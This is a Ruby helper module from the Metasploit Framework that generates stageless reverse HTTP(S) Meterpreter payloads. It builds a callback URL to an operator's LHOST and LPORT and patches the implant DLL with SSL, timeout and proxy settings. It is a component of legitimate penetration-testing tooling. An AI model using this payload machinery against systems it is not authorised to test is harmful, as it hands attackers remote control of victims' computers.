##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/parser/x509_certificate'
require 'msf/core/payload/uuid_options'

module Msf

##
#
# Helper functionality for handling of stageless http(s) payloads
#
##

module Handler::ReverseHttp::Stageless

  include Msf::Payload::Windows::VerifySsl
  include Msf::Payload::UUIDOptions

  def initialize_stageless
    register_options([
      OptString.new('EXTENSIONS', [false, "Comma-separated list of extensions to load"]),
    ], self.class)
  end

  def generate_stageless(ssl, &block)
    url = "https://#{datastore['LHOST']}:#{datastore['LPORT']}#{generate_uri_uuid_mode(:connect)}/"

    unless block_given?
      raise ArgumentError, "Stageless generation requires a block argument"
    end

    # invoke the given function to generate the architecture specific payload
    block.call(url) do |dll|

      verify_cert_hash = nil
      if ssl
        verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
                                             datastore['HandlerSSLCert'])
      end

      Rex::Payloads::Meterpreter::Patch.patch_passive_service!(dll,
        :url           => url,
        :ssl           => ssl,
        :ssl_cert_hash => verify_cert_hash,
        :expiration    => datastore['SessionExpirationTimeout'].to_i,
        :comm_timeout  => datastore['SessionCommunicationTimeout'].to_i,
        :ua            => datastore['MeterpreterUserAgent'],
        :proxy_host    => datastore['PayloadProxyHost'],
        :proxy_port    => datastore['PayloadProxyPort'],
        :proxy_type    => datastore['PayloadProxyType'],
        :proxy_user    => datastore['PayloadProxyUser'],
        :proxy_pass    => datastore['PayloadProxyPass'])
    end

  end

end

end
